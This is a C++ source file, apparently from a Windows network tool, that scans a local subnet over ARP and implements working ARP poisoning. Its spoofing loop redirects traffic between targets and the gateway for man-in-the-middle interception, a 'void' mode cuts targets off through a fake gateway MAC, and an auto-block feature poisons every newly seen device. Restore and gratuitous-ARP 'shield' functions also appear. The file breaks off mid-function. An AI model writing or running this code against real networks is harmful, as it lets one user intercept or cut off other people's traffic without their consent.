// src/ArpEngine.cpp
#include "ArpEngine.h"
#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windot11.h>
#include <wlanapi.h>
#include <sstream>
#include <iomanip>
#include <chrono>

#pragma comment(lib, "wlanapi.lib")
#pragma comment(lib, "ole32.lib")

// ============================================================================
// OUI vendor prefix table (~80 common manufacturers)
// ============================================================================
struct OuiEntry {
    uint8_t prefix[3];
    const char* vendor;
};

static const OuiEntry g_ouiTable[] = {
    {{ 0x00, 0x50, 0x56 }, "VMware"},
    {{ 0x00, 0x0C, 0x29 }, "VMware"},
    {{ 0x00, 0x15, 0x5D }, "Microsoft (Hyper-V)"},
    {{ 0x00, 0x1C, 0x42 }, "Parallels"},
    {{ 0x08, 0x00, 0x27 }, "Oracle VirtualBox"},
    {{ 0x3C, 0x22, 0xFB }, "Apple"},
    {{ 0xA4, 0x83, 0xE7 }, "Apple"},
    {{ 0x14, 0x7D, 0xDA }, "Apple"},
    {{ 0xF0, 0x18, 0x98 }, "Apple"},
    {{ 0xAC, 0xDE, 0x48 }, "Apple"},
    {{ 0x00, 0x17, 0xF2 }, "Apple"},
    {{ 0xD0, 0x81, 0x7A }, "Apple"},
    {{ 0x78, 0x7B, 0x8A }, "Apple"},
    {{ 0xE0, 0xB5, 0x2D }, "Samsung"},
    {{ 0x8C, 0x77, 0x12 }, "Samsung"},
    {{ 0xAC, 0x5F, 0x3E }, "Samsung"},
    {{ 0x38, 0x2C, 0x4A }, "Samsung"},
    {{ 0xC0, 0x97, 0x27 }, "Samsung"},
    {{ 0x30, 0xCB, 0x36 }, "Samsung"},
    {{ 0x5C, 0xE9, 0x1E }, "Samsung"},
    {{ 0x84, 0x25, 0x19 }, "Samsung"},
    {{ 0x34, 0x14, 0xB5 }, "Intel"},
    {{ 0x3C, 0x97, 0x0E }, "Intel"},
    {{ 0x00, 0x1E, 0x67 }, "Intel"},
    {{ 0x8C, 0xEC, 0x4B }, "Intel"},
    {{ 0xB4, 0x96, 0x91 }, "Intel"},
    {{ 0x48, 0x51, 0xB7 }, "Intel"},
    {{ 0x4C, 0xEB, 0x42 }, "Intel"},
    {{ 0xCC, 0x2D, 0xE0 }, "MikroTik"},
    {{ 0xE4, 0x8D, 0x8C }, "MikroTik"},
    {{ 0xB8, 0x69, 0xF4 }, "TP-Link"},
    {{ 0xEC, 0x08, 0x6B }, "TP-Link"},
    {{ 0x50, 0xC7, 0xBF }, "TP-Link"},
    {{ 0x14, 0xEB, 0xB6 }, "TP-Link"},
    {{ 0xC0, 0x25, 0x06 }, "TP-Link"},
    {{ 0xA4, 0x2B, 0xB0 }, "TP-Link"},
    {{ 0x10, 0xFE, 0xED }, "TP-Link"},
    {{ 0xE8, 0xDE, 0x27 }, "TP-Link"},
    {{ 0xB0, 0x4E, 0x26 }, "TP-Link"},
    {{ 0x60, 0xA4, 0x4C }, "ASUSTek"},
    {{ 0x04, 0x92, 0x26 }, "ASUSTek"},
    {{ 0x1C, 0x87, 0x2C }, "ASUSTek"},
    {{ 0x2C, 0x56, 0xDC }, "ASUSTek"},
    {{ 0xD8, 0x50, 0xE6 }, "ASUSTek"},
    {{ 0x9C, 0x5C, 0x8E }, "ASUSTek"},
    {{ 0x40, 0xB0, 0x76 }, "ASUSTek"},
    {{ 0x34, 0x97, 0xF6 }, "ASUSTek"},
    {{ 0xFC, 0xFB, 0xFB }, "Cisco"},
    {{ 0x00, 0x0C, 0xCE }, "Cisco"},
    {{ 0x00, 0x26, 0x0B }, "Cisco"},
    {{ 0x44, 0xD3, 0xCA }, "Cisco"},
    {{ 0x5C, 0x50, 0x15 }, "Cisco"},
    {{ 0x00, 0x23, 0x69 }, "Cisco-Linksys"},
    {{ 0x00, 0x17, 0x88 }, "Philips Hue"},
    {{ 0xDC, 0xA6, 0x32 }, "Raspberry Pi"},
    {{ 0xB8, 0x27, 0xEB }, "Raspberry Pi"},
    {{ 0xE4, 0x5F, 0x01 }, "Raspberry Pi"},
    {{ 0x28, 0xCD, 0xC1 }, "Raspberry Pi"},
    {{ 0x18, 0xFE, 0x34 }, "Espressif (ESP)"},
    {{ 0x24, 0x0A, 0xC4 }, "Espressif (ESP)"},
    {{ 0xA4, 0xCF, 0x12 }, "Espressif (ESP)"},
    {{ 0x7C, 0x10, 0xC9 }, "Xiaomi"},
    {{ 0x64, 0xCC, 0x2E }, "Xiaomi"},
    {{ 0x28, 0x6C, 0x07 }, "Xiaomi"},
    {{ 0x9C, 0x99, 0xA0 }, "Xiaomi"},
    {{ 0x74, 0x23, 0x44 }, "Xiaomi"},
    {{ 0x78, 0x11, 0xDC }, "Xiaomi"},
    {{ 0xC8, 0x3A, 0x35 }, "Tenda"},
    {{ 0x50, 0x2B, 0x73 }, "Tenda"},
    {{ 0x00, 0x1E, 0x58 }, "D-Link"},
    {{ 0x1C, 0xAF, 0xF7 }, "D-Link"},
    {{ 0x04, 0xD3, 0xB0 }, "Huawei"},
    {{ 0xE0, 0x19, 0x1D }, "Huawei"},
    {{ 0x48, 0x46, 0xFB }, "Huawei"},
    {{ 0x30, 0xD1, 0x6B }, "Huawei"},
    {{ 0x88, 0x66, 0xA5 }, "Huawei"},
    {{ 0x20, 0x47, 0xDA }, "Dell"},
    {{ 0xF8, 0xDB, 0x88 }, "Dell"},
    {{ 0x00, 0x14, 0x22 }, "Dell"},
    {{ 0xD4, 0x81, 0xD7 }, "Dell"},
    {{ 0x7C, 0xB2, 0x7D }, "Realtek"},
    {{ 0x00, 0xE0, 0x4C }, "Realtek"},
    {{ 0x52, 0x54, 0x00 }, "QEMU/KVM"},
    {{ 0x00, 0x00, 0x00 }, nullptr}  // sentinel
};

ArpEngine::ArpEngine() : m_running(false), m_scanning(false), m_recvHandle(nullptr), 
    m_sendHandle(nullptr), m_gatewayMacKnown(false), m_subnetMask(0), m_prefixLength(24),
    m_shieldActive(false), m_turboActive(false), m_autoBlockActive(false) {
    memset(m_localMac, 0, 6);
    memset(m_gatewayMac, 0xFF, 6);
}

ArpEngine::~ArpEngine() {
    m_running = false;
    m_scanning = false;
    m_shieldActive = false;
    m_autoBlockActive = false;
    if (m_listenerThread.joinable()) m_listenerThread.join();
    if (m_spoofThread.joinable()) m_spoofThread.join();
    if (m_scanThread.joinable()) m_scanThread.join();
    if (m_shieldThread.joinable()) m_shieldThread.join();
    if (m_recvHandle) pcap_close(m_recvHandle);
    if (m_sendHandle) pcap_close(m_sendHandle);
}

std::string ArpEngine::lookupVendor(const uint8_t mac[6]) const {
    for (int i = 0; g_ouiTable[i].vendor != nullptr; ++i) {
        if (mac[0] == g_ouiTable[i].prefix[0] &&
            mac[1] == g_ouiTable[i].prefix[1] &&
            mac[2] == g_ouiTable[i].prefix[2]) {
            return g_ouiTable[i].vendor;
        }
    }
    return "Unknown";
}

uint32_t ArpEngine::prefixToMask(int prefixLength) const {
    if (prefixLength <= 0) return 0;
    if (prefixLength >= 32) return 0xFFFFFFFF;
    uint32_t mask = htonl(0xFFFFFFFF << (32 - prefixLength));
    return mask;
}

// ============================================================================
// Network environment detection
// ============================================================================
void ArpEngine::detectNetworkEnvironment(IP_ADAPTER_ADDRESSES* adapter) {
    // Adapter type
    switch (adapter->IfType) {
    case IF_TYPE_IEEE80211:
        m_netInfo.adapterType = "Wi-Fi";
        break;
    case IF_TYPE_ETHERNET_CSMACD:
        m_netInfo.adapterType = "Ethernet";
        break;
    case IF_TYPE_SOFTWARE_LOOPBACK:
        m_netInfo.adapterType = "Loopback";
        break;
    case IF_TYPE_TUNNEL:
        m_netInfo.adapterType = "Tunnel/VPN";
        break;
    default:
        m_netInfo.adapterType = "Other (" + std::to_string(adapter->IfType) + ")";
        break;
    }

    // Friendly description
    if (adapter->Description) {
        char desc[256];
        WideCharToMultiByte(CP_UTF8, 0, adapter->Description, -1, desc, sizeof(desc), NULL, NULL);
        m_netInfo.adapterDesc = desc;
    }

    // Prefix length from unicast address (CIDR notation)
    if (adapter->FirstUnicastAddress) {
        auto* ua = adapter->FirstUnicastAddress;
        m_prefixLength = (int)ua->OnLinkPrefixLength;
        if (m_prefixLength == 0) m_prefixLength = 24; // Fallback
        m_subnetMask = prefixToMask(m_prefixLength);
    }

    m_netInfo.prefixLength = m_prefixLength;
    m_netInfo.subnetMask = m_subnetMask;

    // Compute subnet base
    uint32_t base = m_localIpNet & m_subnetMask;
    struct in_addr ba;
    ba.S_un.S_addr = base;
    m_netInfo.subnetBase = inet_ntoa(ba);

    // DHCP
    if (adapter->Flags & IP_ADAPTER_DHCP_ENABLED) {
        m_netInfo.dhcpEnabled = true;
    }

    // DNS servers
    for (auto* dns = adapter->FirstDnsServerAddress; dns; dns = dns->Next) {
        if (dns->Address.lpSockaddr->sa_family == AF_INET) {
            char buf[16];
            struct sockaddr_in* sa = (struct sockaddr_in*)dns->Address.lpSockaddr;
            inet_ntop(AF_INET, &sa->sin_addr, buf, sizeof(buf));
            if (m_netInfo.dns1.empty())
                m_netInfo.dns1 = buf;
            else if (m_netInfo.dns2.empty())
                m_netInfo.dns2 = buf;
        }
    }

    // Link speed
    ULONG64 speed = adapter->TransmitLinkSpeed;
    if (speed == 0) speed = adapter->ReceiveLinkSpeed;
    m_netInfo.linkSpeedBps = speed;  // raw bits per second
    if (speed >= 1000000000ULL)
        m_netInfo.linkSpeed = std::to_string(speed / 1000000000ULL) + " Gbps";
    else if (speed >= 1000000ULL)
        m_netInfo.linkSpeed = std::to_string(speed / 1000000ULL) + " Mbps";
    else if (speed > 0)
        m_netInfo.linkSpeed = std::to_string(speed / 1000ULL) + " Kbps";
    else
        m_netInfo.linkSpeed = "Unknown";

    // MAC address formatted
    std::stringstream ss;
    for (int i = 0; i < 6; ++i)
        ss << std::hex << std::setw(2) << std::setfill('0') << (int)m_localMac[i] << (i < 5 ? ":" : "");
    m_netInfo.macAddress = ss.str();

    // Store GUID for WiFi SSID lookup
    m_adapterGuid = adapter->AdapterName;

    // WiFi SSID detection
    if (adapter->IfType == IF_TYPE_IEEE80211) {
        detectWifiSSID();
    }
}

void ArpEngine::detectWifiSSID() {
    HANDLE hClient = NULL;
    DWORD dwMaxClient = 2;
    DWORD dwCurVersion = 0;
    DWORD dwResult = WlanOpenHandle(dwMaxClient, NULL, &dwCurVersion, &hClient);
    if (dwResult != ERROR_SUCCESS) return;

    PWLAN_INTERFACE_INFO_LIST pIfList = NULL;
    dwResult = WlanEnumInterfaces(hClient, NULL, &pIfList);
    if (dwResult != ERROR_SUCCESS) {
        WlanCloseHandle(hClient, NULL);
        return;
    }

    for (DWORD i = 0; i < pIfList->dwNumberOfItems; i++) {
        PWLAN_INTERFACE_INFO pIfInfo = &pIfList->InterfaceInfo[i];
        if (pIfInfo->isState == wlan_interface_state_connected) {
            PWLAN_CONNECTION_ATTRIBUTES pConnAttr = NULL;
            DWORD dwSize = 0;
            WLAN_OPCODE_VALUE_TYPE opCode = wlan_opcode_value_type_invalid;
            dwResult = WlanQueryInterface(hClient, &pIfInfo->InterfaceGuid,
                wlan_intf_opcode_current_connection, NULL, &dwSize, (PVOID*)&pConnAttr, &opCode);
            if (dwResult == ERROR_SUCCESS && pConnAttr) {
                DOT11_SSID ssid = pConnAttr->wlanAssociationAttributes.dot11Ssid;
                m_netInfo.ssid = std::string((char*)ssid.ucSSID, ssid.uSSIDLength);
                WlanFreeMemory(pConnAttr);
                break;
            }
        }
    }

    if (pIfList) WlanFreeMemory(pIfList);
    WlanCloseHandle(hClient, NULL);
}

// ============================================================================
// Initialize — improved adapter selection
// ============================================================================
bool ArpEngine::initialize() {
    // Use larger buffer and include DNS info
    ULONG len = 32768;
    IP_ADAPTER_ADDRESSES* pAddr = (IP_ADAPTER_ADDRESSES*)malloc(len);
    ULONG flags = GAA_FLAG_INCLUDE_GATEWAYS | GAA_FLAG_INCLUDE_PREFIX;
    
    DWORD result = GetAdaptersAddresses(AF_INET, flags, NULL, pAddr, &len);
    if (result == ERROR_BUFFER_OVERFLOW) {
        free(pAddr);
        pAddr = (IP_ADAPTER_ADDRESSES*)malloc(len);
        result = GetAdaptersAddresses(AF_INET, flags, NULL, pAddr, &len);
    }
    if (result != NO_ERROR) {
        free(pAddr);
        return false;
    }

    // Score each adapter to pick the best one
    // Prefer: physical adapters with gateway > WiFi > Ethernet > others
    IP_ADAPTER_ADDRESSES* bestAdapter = nullptr;
    int bestScore = -1;

    for (auto* cur = pAddr; cur; cur = cur->Next) {
        if (cur->OperStatus != IfOperStatusUp) continue;
        if (cur->IfType == IF_TYPE_SOFTWARE_LOOPBACK) continue;
        if (!cur->FirstUnicastAddress) continue;
        
        int score = 0;
        
        // Has a gateway address = internet-connected = strong preference
        if (cur->FirstGatewayAddress) score += 100;
        
        // Physical adapter types preferred
        if (cur->IfType == IF_TYPE_ETHERNET_CSMACD) score += 50;
        if (cur->IfType == IF_TYPE_IEEE80211) score += 40;
        
        // Non-virtual adapters preferred (check description for common virtual names)
        if (cur->Description) {
            char desc[256];
            WideCharToMultiByte(CP_UTF8, 0, cur->Description, -1, desc, sizeof(desc), NULL, NULL);
            std::string d(desc);
            // Penalize virtual adapters
            if (d.find("Virtual") != std::string::npos) score -= 30;
            if (d.find("VPN") != std::string::npos) score -= 30;
            if (d.find("Hyper-V") != std::string::npos) score -= 30;
            if (d.find("VMware") != std::string::npos) score -= 30;
            if (d.find("VirtualBox") != std::string::npos) score -= 30;
            if (d.find("Loopback") != std::string::npos) score -= 50;
        }
        
        // Has physical MAC (not all zeros)
        bool hasMac = false;
        for (DWORD j = 0; j < cur->PhysicalAddressLength; j++) {
            if (cur->PhysicalAddress[j] != 0) { hasMac = true; break; }
        }
        if (hasMac) score += 10;

        if (score > bestScore) {
            bestScore = score;
            bestAdapter = cur;
        }
    }

    if (!bestAdapter) {
        free(pAddr);
        return false;
    }

    // Extract adapter info
    m_adapterName = "\\Device\\NPF_" + std::string(bestAdapter->AdapterName);
    memcpy(m_localMac, bestAdapter->PhysicalAddress, 6);
    
    if (bestAdapter->FirstUnicastAddress) {
        m_localIpNet = ((sockaddr_in*)bestAdapter->FirstUnicastAddress->Address.lpSockaddr)->sin_addr.S_un.S_addr;
        m_localIp = inet_ntoa(((sockaddr_in*)bestAdapter->FirstUnicastAddress->Address.lpSockaddr)->sin_addr);
    }
    if (bestAdapter->FirstGatewayAddress) {
        m_gatewayIpNet = ((sockaddr_in*)bestAdapter->FirstGatewayAddress->Address.lpSockaddr)->sin_addr.S_un.S_addr;
        m_gatewayIp = inet_ntoa(((sockaddr_in*)bestAdapter->FirstGatewayAddress->Address.lpSockaddr)->sin_addr);
    }

    // Detect full network environment
    detectNetworkEnvironment(bestAdapter);

    free(pAddr);

    char err[PCAP_ERRBUF_SIZE];
    m_recvHandle = pcap_open_live(m_adapterName.c_str(), 65536, 1, 10, err);
    m_sendHandle = pcap_open_live(m_adapterName.c_str(), 65536, 1, 10, err);
    if (!m_recvHandle || !m_sendHandle) return false;

    // Apply ARP filter to receiver
    struct bpf_program fcode;
    if (pcap_compile(m_recvHandle, &fcode, "arp", 1, PCAP_NETMASK_UNKNOWN) != -1) {
        pcap_setfilter(m_recvHandle, &fcode);
        pcap_freecode(&fcode);
    }

    m_running = true;
    m_listenerThread = std::thread(&ArpEngine::listenerLoop, this);
    m_spoofThread = std::thread(&ArpEngine::spoofingLoop, this);

    return true;
}

// ============================================================================
// Subnet scan — uses actual prefix length for accurate scanning
// ============================================================================
void ArpEngine::scanSubnet() {
    if (m_scanning) return;
    if (m_scanThread.joinable()) m_scanThread.join();
    m_scanning = true;
    m_scanThread = std::thread(&ArpEngine::scanWorker, this);
}

void ArpEngine::scanWorker() {
    // Calculate the actual subnet range from prefix length
    uint32_t mask = m_subnetMask;
    if (mask == 0) mask = htonl(0xFFFFFF00); // fallback /24
    
    uint32_t network = m_localIpNet & mask;        // Network address
    uint32_t hostMask = ~ntohl(mask);               // Host part mask in host order
    uint32_t numHosts = hostMask;                    // Total host addresses (including .0 and .255)
    
    // Cap to prevent insane scan ranges (e.g. /8 = 16M hosts)
    if (numHosts > 1024) numHosts = 1024;
    
    // Multi-pass scan for reliability
    for (int pass = 0; pass < 3 && m_scanning; ++pass) {
        for (uint32_t i = 1; i < numHosts; ++i) {
            if (!m_scanning) break;
            
            // Construct target IP: network | host_part_in_network_byte_order
            uint32_t target = network | htonl(i);
            
            // Skip our own IP
            if (target == m_localIpNet) continue;
            
            sendArpRequest(m_sendHandle, target);
            
            // Rate limit: faster on first pass, slower on subsequent
            int delayMs = (pass == 0) ? 3 : 10;
            std::this_thread::sleep_for(std::chrono::milliseconds(delayMs));
        }
        
        // Wait between passes for late replies
        if (pass < 2) {
            std::this_thread::sleep_for(std::chrono::milliseconds(1500));
        }
    }
    
    // Final wait for stragglers
    std::this_thread::sleep_for(std::chrono::seconds(2));
    m_scanning = false;
}

std::vector<DeviceInfo> ArpEngine::getDeviceList() {
    std::lock_guard<std::mutex> lock(m_devicesMutex);
    std::vector<DeviceInfo> list;
    for (auto const& [ip, info] : m_devices) {
        list.push_back(info);
    }
    return list;
}

void ArpEngine::listenerLoop() {
    struct pcap_pkthdr* header;
    const u_char* data;
    while (m_running) {
        int res = pcap_next_ex(m_recvHandle, &header, &data);
        if (res <= 0) continue;

        FullArpPacket* pkg = (FullArpPacket*)data;
        if (ntohs(pkg->eth.type) == 0x0806 && ntohs(pkg->arp.opcode) == 2) { // ARP Reply
            struct in_addr addr; addr.S_un.S_addr = pkg->arp.sender_ip;
            std::string ip = inet_ntoa(addr);
            if (ip == m_localIp) continue;

            std::stringstream ss;
            for(int i=0; i<6; ++i) ss << std::hex << std::setw(2) << std::setfill('0') << (int)pkg->arp.sender_mac[i] << (i<5?":":"");
            std::string mac = ss.str();

            std::string vendor = lookupVendor(pkg->arp.sender_mac);

            bool isNew = false;
            {
                std::lock_guard<std::mutex> lock(m_devicesMutex);
                if (m_devices.find(ip) == m_devices.end()) {
                    auto now = std::chrono::system_clock::now();
                    std::time_t now_c = std::chrono::system_clock::to_time_t(now);
                    char timeBuf[64];
                    ctime_s(timeBuf, sizeof(timeBuf), &now_c);
                    std::string firstSeenStr = timeBuf;
                    if (!firstSeenStr.empty() && firstSeenStr.back() == '\n') firstSeenStr.pop_back();

                    DeviceInfo info;
                    info.ip = ip;
                    info.mac = mac;
                    info.hostname = (ip == m_gatewayIp ? "GATEWAY" : "Resolving...");
                    info.vendor = vendor;
                    info.firstSeen = firstSeenStr;
                    info.os = "Unknown";
                    
                    m_devices[ip] = info;
                    isNew = true;
                } else {
                    m_devices[ip].mac = mac;
                    m_devices[ip].vendor = vendor;
                }
            }
            if (isNew) {
                // Background hostname resolution using NetBIOS/DNS
                std::thread([this, ip]() {
                    struct sockaddr_in sa;
                    memset(&sa, 0, sizeof(sa));
                    sa.sin_family = AF_INET;
                    inet_pton(AF_INET, ip.c_str(), &sa.sin_addr);

                    char host[NI_MAXHOST];
                    if (getnameinfo((struct sockaddr*)&sa, sizeof(sa), host, sizeof(host), NULL, 0, NI_NAMEREQD) == 0) {
                        updateDeviceHostname(ip, host, "");
                    } else {
                        updateDeviceHostname(ip, "Unknown", "");
                    }
                }).detach();
            }
            if (ip == m_gatewayIp) {
                memcpy(m_gatewayMac, pkg->arp.sender_mac, 6);
                m_gatewayMacKnown = true;
            }

            // Auto-block: if enabled and this is a new unknown device, block it
            if (m_autoBlockActive && isNew && ip != m_gatewayIp && m_gatewayMacKnown) {
                std::lock_guard<std::mutex> lock(m_blockMutex);
                if (m_knownDevices.find(ip) == m_knownDevices.end()) {
                    // New device — auto-block
                    m_blockedDevices.insert(ip);
                    
                    // Start poisoning to cut this device
                    PoisonTarget pt;
                    pt.ip = ip;
                    memcpy(pt.mac, pkg->arp.sender_mac, 6);
                    {
                        std::lock_guard<std::mutex> plock(m_poisonMutex);
                        m_poisonTargets[ip] = pt;
                    }
                    {
                        std::lock_guard<std::mutex> dlock(m_devicesMutex);
                        m_devices[ip].isPoisoned = true;
                        m_devices[ip].isCut = true;
                        m_devices[ip].isBlocked = true;
                    }
                }
            }
        }
    }
}

void ArpEngine::sendArpRequest(pcap_t* handle, uint32_t targetIpNet) {
    FullArpPacket pkg;
    memset(pkg.eth.dest, 0xFF, 6);
    memcpy(pkg.eth.src, m_localMac, 6);
    pkg.eth.type = htons(0x0806);

    pkg.arp.hw_type = htons(1);
    pkg.arp.proto_type = htons(0x0800);
    pkg.arp.hw_size = 6;
    pkg.arp.proto_size = 4;
    pkg.arp.opcode = htons(1);
    memcpy(pkg.arp.sender_mac, m_localMac, 6);
    pkg.arp.sender_ip = m_localIpNet;
    memset(pkg.arp.target_mac, 0x00, 6);
    pkg.arp.target_ip = targetIpNet;

    pcap_sendpacket(handle, (const u_char*)&pkg, sizeof(pkg));
}

void ArpEngine::startSpoofing(const std::string& targetIp, const std::string& targetMac) {
    std::lock_guard<std::mutex> lock(m_poisonMutex);
    PoisonTarget pt;
    pt.ip = targetIp;
    
    // Parse MAC string
    int m[6];
    sscanf(targetMac.c_str(), "%x:%x:%x:%x:%x:%x", &m[0], &m[1], &m[2], &m[3], &m[4], &m[5]);
    for(int i=0; i<6; ++i) pt.mac[i] = (uint8_t)m[i];

    m_poisonTargets[targetIp] = pt;
}

void ArpEngine::startVoidSpoofing(const std::string& targetIp, const std::string& targetMac) {
    std::lock_guard<std::mutex> lock(m_poisonMutex);
    PoisonTarget pt;
    pt.ip = targetIp;
    pt.isVoid = true;
    
    // Parse MAC string
    int m[6];
    sscanf_s(targetMac.c_str(), "%x:%x:%x:%x:%x:%x", &m[0], &m[1], &m[2], &m[3], &m[4], &m[5]);
    for(int i=0; i<6; ++i) pt.mac[i] = (uint8_t)m[i];

    m_poisonTargets[targetIp] = pt;
}

void ArpEngine::stopSpoofing(const std::string& targetIp) {
    std::lock_guard<std::mutex> lock(m_poisonMutex);
    m_poisonTargets.erase(targetIp);
}

void ArpEngine::stopAllSpoofing() {
    std::lock_guard<std::mutex> lock(m_poisonMutex);
    m_poisonTargets.clear();
}

void ArpEngine::spoofingLoop() {
    while (m_running) {
        if (m_gatewayMacKnown) {
            std::lock_guard<std::mutex> lock(m_poisonMutex);
            for (auto const& [ip, pt] : m_poisonTargets) {
                uint32_t targetIpNet = inet_addr(ip.c_str());
                if (pt.isVoid) {
                    uint8_t fakeMac[6] = { 0x02, 0x00, 0x00, 0x00, 0x00, 0x00 };
                    // ONLY tell the Target: "Gateway is at Fake MAC"
                    // Target sends all traffic to fake MAC = packets dropped by switch
                    // DO NOT touch the gateway — our own routing must stay clean
                    sendArpReplyWithMac(m_sendHandle, targetIpNet, pt.mac, m_gatewayIpNet, fakeMac);
                } else {
                    // MITM mode: Tell Target "I am Gateway" (traffic flows through us)
                    sendArpReply(m_sendHandle, targetIpNet, pt.mac, m_gatewayIpNet);
                    // Tell Gateway "I am Target" (return traffic flows through us)
                    sendArpReply(m_sendHandle, m_gatewayIpNet, m_gatewayMac, targetIpNet);
                }
            }
        }
        std::this_thread::sleep_for(std::chrono::seconds(2));
    }
}

void ArpEngine::sendArpReply(pcap_t* handle, uint32_t targetIpNet, const uint8_t* targetMac, uint32_t spoofIpNet) {
    FullArpPacket pkg;
    memcpy(pkg.eth.dest, targetMac, 6);
    memcpy(pkg.eth.src, m_localMac, 6);
    pkg.eth.type = htons(0x0806);

    pkg.arp.hw_type = htons(1);
    pkg.arp.proto_type = htons(0x0800);
    pkg.arp.hw_size = 6;
    pkg.arp.proto_size = 4;
    pkg.arp.opcode = htons(2); // Reply
    memcpy(pkg.arp.sender_mac, m_localMac, 6);
    pkg.arp.sender_ip = spoofIpNet;
    memcpy(pkg.arp.target_mac, targetMac, 6);
    pkg.arp.target_ip = targetIpNet;

    pcap_sendpacket(handle, (const u_char*)&pkg, sizeof(pkg));
}

int ArpEngine::getDeviceCount() const {
    return (int)m_devices.size();
}

void ArpEngine::setDeviceFlags(const std::string& ip, bool poisoned, bool cut, bool throttled, bool delayed) {
    std::lock_guard<std::mutex> lock(m_devicesMutex);
    auto it = m_devices.find(ip);
    if (it != m_devices.end()) {
        it->second.isPoisoned = poisoned;
        it->second.isCut = cut;
        it->second.isThrottled = throttled;
        it->second.isDelayed = delayed;
    }
}

void ArpEngine::updateDeviceHostname(const std::string& ip, const std::string& hostname, const std::string& os) {
    std::lock_guard<std::mutex> lock(m_devicesMutex);
    auto it = m_devices.find(ip);
    if (it != m_devices.end()) {
        if (!hostname.empty()) it->second.hostname = hostname;
        if (!os.empty()) it->second.os = os;
    }
}

// Send ARP reply with a specific sender MAC (not our own)
void ArpEngine::sendArpReplyWithMac(pcap_t* handle, uint32_t targetIpNet, const uint8_t* targetMac, uint32_t senderIpNet, const uint8_t* senderMac) {
    FullArpPacket pkg;
    memcpy(pkg.eth.dest, targetMac, 6);
    memcpy(pkg.eth.src, senderMac, 6);  // Use the REAL sender MAC at ethernet level too
    pkg.eth.type = htons(0x0806);

    pkg.arp.hw_type = htons(1);
    pkg.arp.proto_type = htons(0x0800);
    pkg.arp.hw_size = 6;
    pkg.arp.proto_size = 4;
    pkg.arp.opcode = htons(2); // Reply
    memcpy(pkg.arp.sender_mac, senderMac, 6);  // Real MAC
    pkg.arp.sender_ip = senderIpNet;
    memcpy(pkg.arp.target_mac, targetMac, 6);
    pkg.arp.target_ip = targetIpNet;

    pcap_sendpacket(handle, (const u_char*)&pkg, sizeof(pkg));
}

// Reset ARP poison for a single target — restore correct gateway-to-target mapping
void ArpEngine::resetPoison(const std::string& targetIp) {
    if (!m_gatewayMacKnown) return;
    
    // Find the target's real MAC
    uint8_t targetMac[6] = {};
    bool found = false;
    {
        std::lock_guard<std::mutex> lock(m_poisonMutex);
        auto it = m_poisonTargets.find(targetIp);
        if (it != m_poisonTargets.end()) {
            memcpy(targetMac, it->second.mac, 6);
            found = true;
        }
    }
    if (!found) {
        // Try from device list
        std::lock_guard<std::mutex> lock(m_devicesMutex);
        auto it = m_devices.find(targetIp);
        if (it != m_devices.end()) {
            int m[6];
            sscanf(it->second.mac.c_str(), "%x:%x:%x:%x:%x:%x", &m[0], &m[1], &m[2], &m[3], &m[4], &m[5]);
            for (int i = 0; i < 6; i++) targetMac[i] = (uint8_t)m[i];
            found = true;
        }
    }
    if (!found) return;

    uint32_t targetIpNet = inet_addr(targetIp.c_str());

    // Send correct ARP mappings (reduced from 5 to 3 for speed)
    for (int i = 0; i < 3; ++i) {
        // Tell the target: "Gateway IP maps to gateway's REAL MAC"
        sendArpReplyWithMac(m_sendHandle, targetIpNet, targetMac, m_gatewayIpNet, m_gatewayMac);
        // Tell the gateway: "Target IP maps to target's REAL MAC"
        sendArpReplyWithMac(m_sendHandle, m_gatewayIpNet, m_gatewayMac, targetIpNet, targetMac);
        std::this_thread::sleep_for(std::chrono::milliseconds(30));
    }

    // Now stop spoofing and clear flags
    stopSpoofing(targetIp);
    setDeviceFlags(targetIp, false, false, false, false);
}

// Reset ALL poisoned targets — non-blocking
void ArpEngine::resetAllPoison() {
    // Step 1: Immediately stop all spoofing threads (instant, no delay)
    stopAllSpoofing();
    
    // Step 2: Clear all device flags immediately
    {
        std::lock_guard<std::mutex> lock(m_devicesMutex);
        for (auto& [map_ip, dev] : m_devices) {
            dev.isPoisoned = false;
            dev.isCut = false;
            dev.isThrottled = false;
            dev.isDelayed = false;
        }
    }
    
    // Step 3: Send ARP correction packets in a background thread (non-blocking)
    std::vector<std::pair<std::string, std::vector<uint8_t>>> targets;
    {
        std::lock_guard<std::mutex> lock(m_devicesMutex);
        for (auto& [map_ip, dev] : m_devices) {
            if (dev.ip == m_gatewayIp || dev.ip == m_localIp) continue;
            // Parse MAC
            uint8_t mac[6];
            unsigned int m[6];
            if (sscanf(dev.mac.c_str(), "%02x:%02x:%02x:%02x:%02x:%02x", 
                       &m[0], &m[1], &m[2], &m[3], &m[4], &m[5]) == 6) {
                for (int i = 0; i < 6; i++) mac[i] = (uint8_t)m[i];
                targets.push_back(std::make_pair(dev.ip, std::vector<uint8_t>(mac, mac + 6)));
            }
        }
    }
    
    // Fire and forget — ARP corrections in background
    if (!targets.empty() && m_sendHandle) {
        std::thread([this, targets]() {
            for (int round = 0; round < 2; ++round) {
                for (size_t i = 0; i < targets.size(); ++i) {
                    uint32_t ipNet = inet_addr(targets[i].first.c_str());
                    sendArpReplyWithMac(m_sendHandle, ipNet, targets[i].second.data(), m_gatewayIpNet, m_gatewayMac);
                    sendArpReplyWithMac(m_sendHandle, m_gatewayIpNet, m_gatewayMac, ipNet, targets[i].second.data());
                }
                std::this_thread::sleep_for(std::chrono::milliseconds(50));
            }
        }).detach();
    }
}

// ============================================================================
// Shield: Gratuitous ARP defense — protect own machine from ARP poisoning
// ============================================================================
void ArpEngine::sendGratuitousArp() {
    if (!m_sendHandle) return;
    
    // Gratuitous ARP reply: broadcast our correct IP→MAC mapping
    // This corrects any poisoned ARP caches pointing at us
    FullArpPacket pkg;
    memset(pkg.eth.dest, 0xFF, 6);             // Broadcast
    memcpy(pkg.eth.src, m_localMac, 6);
    pkg.eth.type = htons(0x0806);

    pkg.arp.hw_type = htons(1);
    pkg.arp.proto_type = htons(0x0800);
    pkg.arp.hw_size = 6;
    pkg.arp.proto_size = 4;
    pkg.arp.opcode = htons(2);                 // Reply
    memcpy(pkg.arp.sender_mac, m_localMac, 6); // Our real MAC
    pkg.arp.sender_ip = m_localIpNet;          // Our real IP
    memset(pkg.arp.target_mac, 0xFF, 6);       // Broadcast target
    pkg.arp.target_ip = m_localIpNet;          // Target = self (gratuitous)

    pcap_sendpacket(m_sendHandle, (const u_char*)&pkg, sizeof(pkg));

    // Also specifically tell the gateway our correct mapping
    if (m_gatewayMacKnown) {
        sendArpReplyWithMac(m_sendHandle, m_gatewayIpNet, m_gatewayMac, m_localIpNet, m_localMac);
